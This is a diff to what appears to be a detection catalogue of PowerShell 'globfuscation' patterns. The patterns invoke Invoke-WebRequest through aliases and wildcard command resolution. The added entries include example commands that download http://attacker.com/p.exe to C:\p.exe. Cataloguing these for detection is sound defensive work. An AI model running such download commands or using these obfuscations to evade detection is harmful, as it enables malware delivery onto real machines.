@@ -19,12 +19,24 @@ Patterns:
   - Pattern: "iwr -Uri ..."
     Wildcards: []
     Notes: "Built-in alias 'iwr' — not a glob but commonly used obfuscation"
+  - Pattern: "curl -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
+    Wildcards: []
+    Notes: "Alias 'curl' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
+  - Pattern: "wget -Uri http://attacker.com/p.exe -OutFile C:\\p.exe"
+    Wildcards: []
+    Notes: "Alias 'wget' for Invoke-WebRequest (Windows PowerShell 5.1 only; removed in PS Core 6+)"
   - Pattern: "& (Get-Command *Web*quest) -Uri ..."
     Wildcards: ["*"]
     Notes: "Full Get-Command with wildcards around 'Web'"
   - Pattern: "& (gcm *-WebR*) -Uri ..."
     Wildcards: ["*"]
     Notes: "Wildcard before verb and in noun"
+  - Pattern: "& (gcm Invok[d-f]-WebRequest) -Uri ..."
+    Wildcards: ["[d-f]"]
+    Notes: "Character range matches 'e' in Invoke"
+  - Pattern: "& (gal i?r) -Uri ..."
+    Wildcards: ["?"]
+    Notes: "Get-Alias with wildcard resolves 'iwr'"
 PlatformNotes: |
   PowerShell cmdlet name resolution supports wildcards via `Get-Command`. The pattern `& (gcm Wildcard*Pattern) -Args` is idiomatic "globfuscation". The `&` operator invokes the resolved cmdlet. Aliases like `iwr`, `curl`, `wget` also resolve to Invoke-WebRequest.
 Resources:
